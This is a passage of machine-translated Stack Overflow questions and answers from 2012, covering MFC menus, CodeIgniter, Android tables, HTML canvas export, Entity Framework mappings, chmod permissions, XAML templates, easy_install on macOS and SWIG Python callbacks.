如何创建我的子菜单，使其与主菜单的其余部分风格相同？

我的代码是用 MFC 编写的，但您的答案不必在 MFC 中（而且可能不能）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T10:14:03.133

我发现了解决方案，但并不真正了解发生了什么。解决方案是防止在函数末尾调用`DestroyMenu`on的析构函数。`subMenu`这是通过调用`subMenu.Detach()`或创建`subMenu`指向 的指针来完成的`CMenu`。

我不明白为什么要把`DestroyMenu`新式菜单变成旧式。我希望菜单要么被破坏而不显示，要么被复制进来`SetMenuItemInfo`，因此它的风格得以保留。谁提供了这个答案，谁得到我的投票：）

另外，我想知道我是否通过调用`Detach`这里来产生资源泄漏，或者我的动态子菜单是否与主菜单一起被破坏。积分等待提供答案的人。

# php - CSS 不想从另一个控制器上传

> ID：12392678
> 
> 赞同：0
> 
> 时间：2012-09-12T16:32:45.960
> 
> 标签：php, css, codeigniter, frameworks

我有一些页眉和页脚，`CSS`当我在控制器中加载视图时，`CSS`显示效果很好。

但是，当我使用另一个控制器加载相同的视图时，`CSS`不会显示。

为什么`CSS`稍后在控制器中调用该文件时不显示该文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:38:00.917

```
 public function __construct()
   {
        parent::__construct();
        $this->load->view("css_file");
   } 
```

将该函数放在控制器文件的顶部。它将加载`CSS`所有方法。这样，您就不必显式加载 CSS，它会一直存在！

或者，您可能需要考虑像[Ocular](https://github.com/lonnieezell/Ocular-Template-Library)这样的模板库。它使您可以在一个命令中加载页眉和页脚（以及其他任何内容，如样式、JS 等）。

模板库将使您的生活变得如此轻松，您将不知道没有模板库是如何度过的。

# android - Android：在回调函数中创建动态表格行会引发异常

> ID：12392682
> 
> 赞同：0
> 
> 时间：2012-09-12T16:33:12.687
> 
> 标签：android, android-layout, exception, callback

为什么在回调函数中执行时会引发以下代码异常？

```
public class TeamPointsDayActivity extends Activity implements IMyCallBack<String>, IMyCallBackTeamPoints {

    private String mDay; 
    private URLHandler mUrlHandler;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_select_team);
        getActionBar().setDisplayHomeAsUpEnabled(true);

        Intent intent = getIntent();
        mDay = intent.getStringExtra(MainActivity.EXTRA_DAY);   
        // !!!!!Calling createTable() here works fine!!!!

    }

    private void createTable() {
        TableLayout table = (TableLayout)findViewById(R.id.mytabletest);

        TableRow tr = new TableRow(TeamPointsDayActivity.this);
        tr.setLayoutParams(new TableRow.LayoutParams(
                LayoutParams.WRAP_CONTENT,
                LayoutParams.WRAP_CONTENT)); 
        tr.setPadding(8, 8, 8, 8);

        TextView labelTV = new TextView(TeamPointsDayActivity.this);
        labelTV.setText("test1111111");
        labelTV.setBackgroundResource(R.drawable.cell_shape);
        labelTV.setPadding(3, 3, 3, 3);
        tr.addView(labelTV);        
        table.addView(tr, new TableRow.LayoutParams(
                LayoutParams.WRAP_CONTENT,
                LayoutParams.WRAP_CONTENT));    
    }

    public void onTeamPointsReadComplete(IGameData data) {
    // Do stuff with "data"...not relevant
        // Adding following line here in this callback function will throw an exception
    createTable();

    }
}

09-13 16:23:32.114: E/AndroidRuntime(799): FATAL EXCEPTION: main
09-13 16:23:32.114: E/AndroidRuntime(799): java.lang.ArithmeticException: divide by zero
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.TableLayout.mutateColumnsWidth(TableLayout.java:583)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.TableLayout.shrinkAndStretchColumns(TableLayout.java:572)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.TableLayout.measureVertical(TableLayout.java:470)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.TableLayout.onMeasure(TableLayout.java:435)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.View.measure(View.java:15172)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4814)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.LinearLayout.measureChildBeforeLayout(LinearLayout.java:1390)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.LinearLayout.measureVertical(LinearLayout.java:681)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.LinearLayout.onMeasure(LinearLayout.java:574)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.View.measure(View.java:15172)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4814)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:310)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.View.measure(View.java:15172)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.LinearLayout.measureVertical(LinearLayout.java:833)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.LinearLayout.onMeasure(LinearLayout.java:574)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.View.measure(View.java:15172)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4814)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:310)
09-13 16:23:32.114: E/AndroidRuntime(799):  at com.android.internal.policy.impl.PhoneWindow$DecorView.onMeasure(PhoneWindow.java:2148)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.View.measure(View.java:15172)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.ViewRootImpl.performMeasure(ViewRootImpl.java:1848)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.ViewRootImpl.measureHierarchy(ViewRootImpl.java:1100)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1273)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:998)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:4212)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.Choreographer$CallbackRecord.run(Choreographer.java:725)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.Choreographer.doCallbacks(Choreographer.java:555)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.Choreographer.doFrame(Choreographer.java:525)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:711)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.os.Handler.handleCallback(Handler.java:615)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.os.Handler.dispatchMessage(Handler.java:92)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.os.Looper.loop(Looper.java:137)
09-13 16:23:32.114: E/AndroidRuntime(799):  at android.app.ActivityThread.main(ActivityThread.java:4745)
09-13 16:23:32.114: E/AndroidRuntime(799):  at java.lang.reflect.Method.invokeNative(Native Method)
09-13 16:23:32.114: E/AndroidRuntime(799):  at java.lang.reflect.Method.invoke(Method.java:511)
09-13 16:23:32.114: E/AndroidRuntime(799):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
09-13 16:23:32.114: E/AndroidRuntime(799):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
09-13 16:23:32.114: E/AndroidRuntime(799):  at dalvik.system.NativeStart.main(Native Method) 
```

真的很奇怪……

有人可以告诉我这里有什么问题吗？否则，我应该如何使用来自回调函数的数据创建动态表行？

编辑：忘记发布 activity_select_team.xml 文件：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:paddingLeft="16dp"
    android:paddingRight="16dp"
    android:id="@+id/playerlayout" >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="1" />

    <TextView
        android:id="@+id/textView2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="2" />

    <TableLayout
        android:id="@+id/mytabletest"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
     android:shrinkColumns="*"  
    android:stretchColumns="*"
    android:background="@drawable/round" >

    <TableRow
        android:id="@+id/row1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:padding="8dp" >       
    </TableRow>

    </TableLayout>

</LinearLayout> 
```

问候， 桑德罗

# image - 将带有图像的画布导出为图像（如 PNG 或 jpg）

> ID：12392685
> 
> 赞同：1
> 
> 时间：2012-09-12T16:33:14.963
> 
> 标签：image, html, canvas, export

我基本上只是想将画布的“http://....png”或“http://....jpg”位置作为图像。

我已经尝试过 toDataURL() 但它不起作用。特别是如果我在画布中加载了图像。

这是我的代码：（顺便说一句，我在这里使用 jQuery）

```
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
<script>
$(document).ready(function(){
 var canvas = $("#canvas");
 var ctx = canvas.get(0).getContext("2d");

 var image1 = new Image();
 image1.src = "http://www.helpinghomelesscats.com/images/cat1.jpg"
 $(image1).load(function(){
   ctx.drawImage(image1,0,0,200,200);
 });

});
</script> 
```

我的 html/body 只有这个：

```
<canvas id="canvas" width="500" height="400"></canvas> 
```

现在，如果您尝试这样做，那效果很好。它显示了那只猫。

但是当我将 toDataURL 添加到我的脚本中时，它就不会发生。

```
var dataImg = canvas.get(0).toDataURL(); 
```

我将此 dataImg 变量加载到另一个单击重定向函数中进行测试，希望它会使用它包含的 base64 url​​ 重定向到页面，但它只是不起作用：

```
$("#canvas").click(function(){
  document.location = dataImg;
}); 
```

它把我带到一个空白页？我在这里想念什么？

非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:52:18.923

您拥有[http://www.helpinghomelesscats.com](http://www.helpinghomelesscats.com)还是您的代码直接托管在该站点上？如果不是，由于跨站点源策略，您将无法执行此操作。最好的方法是让一些服务器端代码抓取图像，然后在您的域上本地提供它。

如果您确实拥有helphomelesscats.com，这应该可以工作，如此处测试

**[现场演示](http://jsfiddle.net/loktar/pJcAR/)**

单击画布并查看日志以查看响应。

# android - 音池问题

> ID：12392688
> 
> 赞同：0
> 
> 时间：2012-09-12T16:33:31.410
> 
> 标签：android, android-mediaplayer, soundpool

我正在开发一个使用 soundpool 播放小声音文件的小游戏。但是，现在似乎我有太多声音文件要添加到声音池中，因为我收到一条错误消息，指出堆溢出。因此，我尝试在需要时加载声音文件，而不是在初始化类实例时加载它们，但结果非常糟糕。

有没有其他方法可以让它使用 soundpool 或者我必须使用媒体播放器来代替？我已经有媒体播放器类，用于播放长声音片段，如音乐文件等。因此，备份计划是创建媒体播放器类的两个实例，它们在两个单独的线程上运行，其中一个线程处理小声音文件。非常感谢任何帮助和想法。

问候！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T20:19:28.853

尝试将`SoundPool`您正在使用的对象分成多个实例。前任。`SoundPool sp1, sp2, sp3;` 不要使用多个`MediaPlayer`对象，因为这将非常缓慢且效率低下。

# jquery - Blueimp Jquery 将文件上传到 2 个服务器

> ID：12392689
> 
> 赞同：0
> 
> 时间：2012-09-12T16:33:31.440
> 
> 标签：jquery, file-upload, blueimp

我正在使用[https://github.com/blueimp/jQuery-File-Upload/](https://github.com/blueimp/jQuery-File-Upload/)插件。

它的作品很棒！我正在尝试更改插件\选项一些如何允许通过相同的单击上传按钮将每个图像发送到具有 CORS 的 2 个服务器。

知道如何将列表中的每个图像发送到两个服务器吗？

# c# - 实体框架 Fluent API 映射

> ID：12392691
> 
> 赞同：2
> 
> 时间：2012-09-12T16:33:38.893
> 
> 标签：c#, entity-framework, ef-code-first

**假设我有这些表：**

```
Role
- RoleId
- Name

UserRole
- UserId
- RoleId

User
- UserId
- Username

UserEmail
- UserId
- EmailId
- IsPrimary

Email
- EmailId
- Address 
```

**现在我的模型应该是这样的：**

```
public class Role {
    public int RoleId { get; set; }
    public string Name { get; set; }
    public virtual ICollection<User> Users { get; set; }
}

public class User {
    public int UserId { get; set; }
    public string Username { get; set; }
    public virtual ICollection<Role> Roles { get; set; }
    public virtual ICollection<UserEmail> UserEmails { get; set; }
}

public class UserEmail {
    public int UserId { get; set; }
    public int EmailId { get; set; }
    public bool IsPrimary { get; set; }
    public virtual User User { get; set; }
    public virtual Email Email { get; set; }
}

public class Email {
    public int EmailId { get; set; }
    public string Address { get; set; }
    public virtual ICollection<UserEmail> UserEmails { get; set; }
} 
```

**这些是我在这种特殊情况下想做的常见和具体的事情：**

**添加主键：**

```
modelBuilder.Entity<Role>().HasKey(q => q.RoleId); 
```

这会与在实体属性中使用属性具有相同的*效果吗？*`Key`如果是这样，为什么还要`modelBuilder`在使用*数据注释*时使用更短且更容易读/写的呢？关于何时使用*Data Annotations*或*Fluent API*是否有任何*约定*？

 ****添加多对多关系：**

```
modelBuilder.Entity<Role>()
    .HasMany(q => q.Users)
    .WithMany(q => q.Roles)
    .Map(q => {
                  q.MapLeftKey("RoleId");
                  q.MapRightKey("UserId");
                  q.ToTable("UserRoles");
              }); 
```

**添加一对多关系：**

```
modelBuilder.Entity<UserEmail>()
    .HasRequired(q => q.User)
    .WithMany(q => q.UserEmails)
    .HasForeignKey(q => q.EmailId); 
```

需要最后一行吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-20T10:16:05.043

是的，该方法与属性`HasKey`具有相同的效果。`[Key]`您可能有很多配置要做，并且更愿意将其全部保留在`ModelBuilder`方法中。另一方面，您可能很少或更喜欢使用其中一些属性。只是给你一些灵活性。

如果你在谈论：

`.HasForeignKey(q => q.EmailId);`

那么在你的情况下，是的，它是必需的。为什么？`UserEmail`因为您已经在实体中创建了自己的外键属性。如果您删除了该属性，您可以删除此行，EF 会在名为`Email_Id`. 您仍然可以通过导航属性访问它`instanceOfUserEmail.Email.EmailId`。**

# macos - 下面的 Chmod 命令有什么作用？

> ID：12392692
> 
> 赞同：0
> 
> 时间：2012-09-12T16:33:41.780
> 
> 标签：macos, terminal, command, chmod

我在下一页遇到了一个命令。[http://alblue.bandlem.com/2011/07/setting-up-google-code-with-git.html](http://alblue.bandlem.com/2011/07/setting-up-google-code-with-git.html)

chmod go=.netrc

在 chmod 人中找不到它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:50:04.570

来自 chmod 手册页中的“有效模式示例”：

> go= 清除组和其他的所有模式位。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T16:55:10.233

`chmod go= .netrc`无权访问组和其他人的文件`.netrc`。
`chmod go=rx .netrc`授予读取和执行访问权限`

基本上，您可以添加`+`、减去`-`和分配`=`某些访问级别。

检查[此链接](http://catcode.com/teachmod/shortcuts.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T16:38:52.977

这意味着“绝对设置这些权限”。在这种情况下，您将清除文件的`g`和`o`权限`.netrc`（因为您没有在等号后命名任何权限）。

如果你做了类似的事情：

> chmod go=r .netrc

您将授予and`read`权限，但清除 and 的所有其他权限。`group``other``g``o`

这里有一些例子：

```
~> pico test.txt <-- Create a file with default permissions
~> ls -l test.txt
-rw-r--r--  1 mike  staff  7 Sep 12 09:39 test.txt
~> chmod go= test.txt <-- Clear the permissions on g and o
~> ls -l test.txt
-rw-------  1 mike  staff  7 Sep 12 09:39 test.txt
~> chmod go=r test.txt <-- Set only read on g and o
~> ls -l test.txt
-rw-r--r--  1 mike  staff  7 Sep 12 09:39 test.txt
~> chmod o=rw test.txt <-- Set read and write only on o
~> ls -l test.txt
-rw-r--rw-  1 mike  staff  7 Sep 12 09:39 test.txt 
```

有关更多信息，请参见符号模式下的[手册](http://docs.oracle.com/cd/E19082-01/819-2239/chmod-1/index.html)页。

# c# - 来自字符串的 XAML ControlTemplate

> ID：12392696
> 
> 赞同：0
> 
> 时间：2012-09-12T16:33:53.110
> 
> 标签：c#, wpf, silverlight, xaml

我正在创建一系列 ControlTemplates 以从某些字符串显示在 WPF 控件上。我使用这段代码：

```
string theTemplate = @"<ControlTemplate xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"">
                <Grid Name=""RootElement"" RenderTransformOrigin=""0.5,0.5"" >
                    <Grid.RenderTransform>
                        <ScaleTransform ScaleX=""1"" ScaleY=""1"" />
                    </Grid.RenderTransform>
                    <VisualStateManager.VisualStateGroups>
                        <VisualStateGroup Name=""CommonStates"">
                            <VisualState Name=""Normal"">
                                <Storyboard>
                                    <DoubleAnimation BeginTime=""00:00:00"" 
                                                                Storyboard.TargetName=""RootElement"" 
                                                                Storyboard.TargetProperty=""(UIElement.RenderTransform).(ScaleTransform.ScaleX)"" 
                                                                To=""1"" Duration=""0:0:0.1"" />
                                    <DoubleAnimation BeginTime=""00:00:00"" 
                                                                Storyboard.TargetName=""RootElement"" 
                                                                Storyboard.TargetProperty=""(UIElement.RenderTransform).(ScaleTransform.ScaleY)"" 
                                                                To=""1"" Duration=""0:0:0.1"" />
                                </Storyboard>
                            </VisualState>
                            <VisualState Name=""MouseOver"">
                                <Storyboard>
                                    <DoubleAnimation BeginTime=""00:00:00"" 
                                                                Storyboard.TargetName=""RootElement"" 
                                                                Storyboard.TargetProperty=""(UIElement.RenderTransform).(ScaleTransform.ScaleX)"" 
                                                                To=""1.5"" Duration=""0:0:0.1"" />
                                    <DoubleAnimation BeginTime=""00:00:00"" 
                                                                Storyboard.TargetName=""RootElement"" 
                                                                Storyboard.TargetProperty=""(UIElement.RenderTransform).(ScaleTransform.ScaleY)"" 
                                                                To=""1.5"" Duration=""0:0:0.1"" />
                                </Storyboard>
                            </VisualState>
                        </VisualStateGroup>
                    </VisualStateManager.VisualStateGroups>
                <Ellipse Height=""{Binding Symbol.Size}"" Width=""{Binding Symbol.Size}"" Fill=""{Binding Symbol.Color}""  Stroke=""Black"">

                </Ellipse>
            </Grid>
        </ControlTemplate>";
System.IO.StringReader stringReader = new System.IO.StringReader(theTemplate);
System.Xml.XmlReader reader = System.Xml.XmlReader.Create(stringReader);
ControlTemplate ct = (ControlTemplate)System.Windows.Markup.XamlReader.Load(reader); 
```

这一切都很好。问题是当我尝试使用我的自定义形状而不是使用椭圆时。在常规 WPF 窗口中，我使用此参考：

```
xmlns:custom="clr-namespace:WpfApplication2" 
```

然后我可以做的不是椭圆：

```
<custom:Square Size=""{Binding Symbol.Size}"" Fill=""{Binding Symbol.Color}"" Stroke=""Black"" RotationAngle=""0"">
</custom:Square> 
```

现在，当我将该行添加到字符串“theTemplate”时，它现在可以工作了。我认为的原因是因为我没有该参考。我尝试在不同的地方添加参考，例如：

```
<ControlTemplate xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:custom="clr-namespace:WpfApplication2" > 
```

并没有工作。我也试过：

```
<custom:Square Size=""{Binding Symbol.Size}"" Fill=""{Binding Symbol.Color}"" Stroke=""Black"" RotationAngle=""0"" xmlns:custom="clr-namespace:WpfApplication2" >
</custom:Square> 
```

而且也不喜欢。

苏，有什么建议吗？如何引用我的自定义形状？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:35:31.577

使用时，`XamlReader`您通常需要完全限定您的 CLR `xmlns`，即添加程序集。

例如

```
xmlns:custom="clr-namespace:WpfApplication2;assembly=WpfApplication2" 
```

# python - Python 3.2.3、easy_install、Mac OS X

> ID：12392699
> 
> 赞同：2
> 
> 时间：2012-09-12T16:34:04.687
> 
> 标签：python, macos, python-3.x, easy-install

我是 Windows 7 用户，请原谅我的无知。我一直在努力帮助我的朋友在她的 Mac OS X 笔记本电脑上轻松安装。我们设法在终端中使用以下命令使 2.7 的所有内容都正常工作：

> python Distribute_setup.py（安装“分发”）
> 
> 简易安装

我们为 Python 3.2.3 尝试了同样的事情：

> python3.2 分发设置.py
> 
> 简易安装

但是该软件包是为 python 2.7 而不是 3.2.3 安装的。据我所知，这是因为 easy_install 仅适用于 2.7。

在我的 Windows 7 上，我设法通过进入命令提示符 python32 目录并执行以下操作来完成所有这些操作：

> 蟒蛇distribute_setup.py

然后进入python32/script目录，直接运行easy_install.exe：

> 简易安装

这会将包安装到 python 3.2.3 没有问题。

**问题：**

我们应该为 Mac OS X 做什么？是否有相当于运行“easy_install.exe”的 Mac？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:53:22.990

您已经完成了正确的第一步，`python3.2 distribute_setup.py`. 那应该已经`easy_install`为您的python3.2安装了一个版本。现在您需要实际使用该`easy_install`命令，而不是为系统 Python 预装 OS X 的命令。如果您仍然有上述命令的输出，或者如果您再次运行该命令，在接近尾声时您应该会看到如下两行：

```
Installing easy_install script to /Library/Frameworks/Python.framework/Versions/3.2/bin
Installing easy_install-3.2 script to /Library/Frameworks/Python.framework/Versions/3.2/bin 
```

这些位置适用于从 python.org 下载的 OS X Python3.2，您可能会看到其他版本的其他内容。这显示了`easy_install`安装脚本的目录。您*可以*使用绝对路径来执行脚本：

```
/Library/Frameworks/Python.framework/Versions/3.2/bin/easy_install ... 
```

但这很不方便。如果你打算广泛使用 Python3.2，你可以修改你的 shell 搜索`PATH`来添加这个目录。对于 OS X 上的大多数 shell：

```
export PATH=/Library/Frameworks/Python.framework/Versions/3.2/bin:$PATH 
```

您可以将其添加到 shell 初始化文件中，例如`~/.bash_profile`. 如果您安装了 python.org Python 3.2，您只需双击即可`/Applications/Python 3.2/Update Shell Profile.command`为您执行此操作。之后您需要打开一个新的终端窗口才能看到更改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-29T19:20:43.960

对于我安装 python3（使用自制软件）的价值，只需要调用正确的二进制文件即可。`easy_install3`已经在系统路径上，就像`easy_install-3.3`.

# c++ - 在 std::vector 中表示原始字节的最佳方法？

> ID：12392702
> 
> 赞同：2
> 
> 时间：2012-09-12T16:34:12.080
> 
> 标签：c++, sockets, stl, buffer, stdvector

我正在使用 ZeroMQ 库`void *`来表示任意二进制数据块。但是我想`std::vector`用来复制和移动这些块。`std::vector`制作表示原始字节的首选惯用方式是什么？我目前正在使用 a`std::vector<unsigned char>`但我想确保我的代码对其他人有意义。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-12T16:35:27.363

任何一个

```
std::vector<unsigned char> 
```

或者

```
#include <cstdint>

std::vector<std::uint8_t> 
```

在我看来，两者都很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:36:36.770

如果您不知道数据的性质，`unsigned char`那么您可以在不弄乱的情况下表示最小的位块。因此，它是任何类型的任意内存块的常见类型。

所以你的矢量看起来非常好。

# c++ - 使用 SWIG 包装对象从 C++ 调用 Python 函数的最简洁方法是什么

> ID：12392703
> 
> 赞同：16
> 
> 时间：2012-09-12T16:34:13.283
> 
> 标签：c++, python, swig

我有以下代码，它使用 Python 回调函数实现了一个简单的 C++ 类（ObjWithPyCallback）。这个想法是用“this”作为单个参数来调用 Python 函数。

问题是，由于 ObjWithPyCallback 是一个 SWIG 包装的对象，我需要 SWIG 类型信息才能创建一个 Python 对象。

问题在于它位于 SWIG 生成的文件“ObjWithPyCallback_wrap.cxx”中。SWIG 可以生成头文件吗？到目前为止，我还无法做到这一点。

但是，即使有头文件，SWIG 和我的主要实现之间也存在循环依赖关系，这很烦人。如果可能的话，我想找到一种方法来避免它。最终 ObjWithPyCallback 最终在与 Python 绑定不同的共享库中结束。

有没有一种干净的方法来解决这个问题？我知道[这篇文章](https://stackoverflow.com/questions/1575802/python-callback-with-swig-wrapped-type)，但它只涉及 SWIG_NewPointerObj 的机制。

提前感谢您的帮助！

这是代码：

文件：example.py

```
import cb

def foo(x=None):
    print("Hello from Foo!")
    # I'd like x to be a reference to a ObjWithPyCallback object.
    print(x)

o = cb.ObjWithPyCallback()
o.setCallback(foo)
o.call() 
```

文件：ObjWithPyCallback.h

```
#include <Python.h>

class ObjWithPyCallback 
{
   public:

      ObjWithPyCallback();
      void setCallback(PyObject *callback);
      void call();

      PyObject *callback_;
}; 
```

文件：ObjWithCallback.cpp

```
#include "ObjWithPyCallback.h"

#include <iostream>

ObjWithPyCallback::ObjWithPyCallback() : callback_(NULL) {}

void ObjWithPyCallback::setCallback(PyObject* callback)
{
   if (!PyCallable_Check(callback))
   {
      std::cerr << "Object is not callable.\n";
   }
   else
   {
      if ( callback_ ) Py_XDECREF(callback_);
      callback_ = callback;
      Py_XINCREF(callback_);
   }
}

void ObjWithPyCallback::call()
{
   if ( ! callback_ )
   {
      std::cerr << "No callback is set.\n";
   }
   else
   {
      // I want to call "callback_(*this)", how to do this cleanly?
      PyObject *result = PyObject_CallFunction(callback_, "");
      if (result == NULL)
         std::cerr << "Callback call failed.\n";
      else
         Py_DECREF(result);
   }
} 
```

文件:: ObjWithPyCallback.i

```
%module cb
%{
   #include "ObjWithPyCallback.h"
%}

%include "ObjWithPyCallback.h" 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-17T16:55:29.777

以下是我解决此问题的工作解决方案。它使用了上述@omnifarious 和@flexo 的建议。

特别是，我们使用 SWIG 导向器创建一个回调类，然后在 Python 中从它派生以获得所需的回调功能，而不引入循环依赖。

此外，我们提供了一个接口，它允许任何可调用的 Python 对象充当回调。我们通过使用 SWIG 中的“pythonpred”指令将一些代码添加到“setCallback”函数来实现这一点。此代码仅检查可调用对象，如果找到，则将其包装在 Callback 实例中。

最后，我们处理与让 C++ 类 (ObjWithPyCallback) 引用导演对象（即 Callback 的子类）相关的内存问题。

文件示例.py：

```
import cb

class CB(cb.Callback):
    def __init__(self):
        super(CB, self).__init__()
    def call(self, x):
        print("Hello from CB!")
        print(x)

def foo(x):
    print("Hello from foo!")
    print(x)

class Bar:
    def __call__(self, x):
        print("Hello from Bar!")
        print(x)

o = cb.ObjWithPyCallback()
mycb=CB()
o.setCallback(mycb)
o.call()
o.setCallback(foo)
o.call()
o.setCallback(Bar())
o.call() 
```

文件 ObjWithPyCallback.i：

```
%module(directors="1") cb
%{
   #include "Callback.h"
   #include "ObjWithPyCallback.h"
%}
%feature("director") Callback;
%feature("nodirector") ObjWithPyCallback;

%feature("pythonprepend") ObjWithPyCallback::setCallback(Callback&) %{
   if len(args) == 1 and (not isinstance(args[0], Callback) and callable(args[0])):
      class CallableWrapper(Callback):
         def __init__(self, f):
            super(CallableWrapper, self).__init__()
            self.f_ = f
         def call(self, obj):
            self.f_(obj)

      args = tuple([CallableWrapper(args[0])])
      args[0].__disown__()
   elif len(args) == 1 and isinstance(args[0], Callback):
      args[0].__disown__()

%}

%include "Callback.h"
%include "ObjWithPyCallback.h" 
```

文件回调.h：

```
#ifndef CALLBACK_H
#define CALLBACK_H

class ObjWithPyCallback;

class Callback
{
   public:
      Callback(){}

      virtual ~Callback(){}
      virtual void call(ObjWithPyCallback& object){} 
};

#endif 
```

文件 ObjWithPyCallback.h：

```
#ifndef OBJWITHPYCALLBACK_H
#define OBJWITHPYCALLBACK_H

class Callback;

class ObjWithPyCallback 
{
   public:

      ObjWithPyCallback();
      ~ObjWithPyCallback();
      void setCallback(Callback &callback);
      void call();

   private:

      Callback* callback_;
};

#endif 
```

文件 ObjWithPyCallback.cpp：

```
#include "ObjWithPyCallback.h"
#include "Callback.h"

#include <iostream>

ObjWithPyCallback::ObjWithPyCallback() : callback_(NULL) {}

ObjWithPyCallback::~ObjWithPyCallback()
{
}

void ObjWithPyCallback::setCallback(Callback &callback)
{
   callback_ = &callback;
}

void ObjWithPyCallback::call()
{
   if ( ! callback_ )
   {
      std::cerr << "No callback is set.\n";
   }
   else
   {
      callback_->call(*this);
   }
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-05-11T07:22:55.250

## 1.解决问题的总体思路：

### (1)。定义一个名为 Callback 的 C++ 类，它有一个方法 run()。

### (2)。在 Python 代码中继承回调，并创建一个实例。

### (3)。使用 C++ 方法将实例绑定到 C++ 指针。

### (4)。使用指针访问在 python 代码中定义的 run()。

## 2.示例代码

### (1)。例子.h

```
class Callback{
    public:
    virtual void run(int n);                                                                                                                                                      
    virtual ~Callback() {}; 
};   
extern Callback * callback;
extern void doSomeWithCallback();
extern void setCallback(Callback * cb); 
```

### (2)。例子.cxx

```
#include <iostream>
#include "example.h"

int n=0;
Callback * callback = NULL;

void Callback::run(int n){ 
    std::cout << "This print from C++: n = " << n << std::endl;
}    

void setCallback(Callback * cb){
    callback = cb; 
}    

void doSomeWithCallback(){
    if(callback == NULL){
        std::cout << "Must set callback first!" << std::endl;
    }else{
        callback->run(n++);
    }                                                                                                                                                                                         
} 
```

### (3)。例子.i

```
/* File : example.i */                                                                                                                                                                        
%module(directors="1") example
%{
#include "example.h"                                                                                                                                                                          
%}

/* turn on director wrapping Callback */
%feature("director") Callback;

%include "example.h" 
```

### 3\. 编译

```
$ swig -c++ -python example.i
$ g++ -c -fPIC example.cxx example_wrap.cxx -I/usr/include/python2.7/
$ g++ -shared example.o example_wrap.o -o _example.so 
```

### 4.在python shell中使用

```
In [1]: import example

In [2]: example.doSomeWithCallback()
Must set callback first!

In [3]: callback = example.Callback()

In [4]: example.setCallback(callback)

In [5]: example.doSomeWithCallback()
This print from C++: n = 0

In [6]: class Callback(example.Callback):
   ...:     def run(self, n):
   ...:         print 'This print from Python: n =', n
   ...:         

In [7]: callback =  Callback()

In [8]: example.setCallback(callback)

In [9]: example.doSomeWithCallback()
This print from Python: n = 1 
```

### 5\. 其他

我认为你还需要更多的东西。尝试：

```
$ ls swig-x.x.x/Examples/python 
```

* * *

## 回答 #3

> 赞同：4
> 
